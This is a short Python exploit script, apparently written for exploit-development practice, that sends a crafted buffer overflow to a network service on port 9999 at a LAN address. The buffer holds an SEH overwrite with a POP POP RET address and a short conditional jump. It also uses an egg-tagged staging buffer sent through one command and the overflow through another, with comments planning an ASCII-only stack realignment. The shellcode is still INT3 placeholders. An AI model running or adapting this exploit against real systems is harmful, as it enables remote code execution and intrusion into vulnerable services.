import socket
import os
import sys

host = '192.168.1.15'
port = 9999

shellcode = 'w00tw00t'
shellcode += '\xcc' * 1000

junk = 'A' * 3494

#JNZ short 8
junk += '\x41\x41\x75\x06'

# POP POP RET address
junk += '\x5e\x19\x50\x62'

# Padding of 4 bytes
junk += '\x41' * 4

# We now have 26 bytes to perform a long JMP backwards using only ascii chars

# EBP is 0x00B7EF2C

# Align ESP, which is 0x00B7EE50, to be at 0x00B7FFFF
# PUSH ESP
# POP EAX
# ADD ESP, 0x11AF
# PUSH EAX
# POP ESP


junk += 'D' * (4500 - len(junk))

sploit = 'LTER /.../' + junk

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send('GDOG ' + shellcode)
expl.recv(1024)
expl.send(sploit)
expl.close()
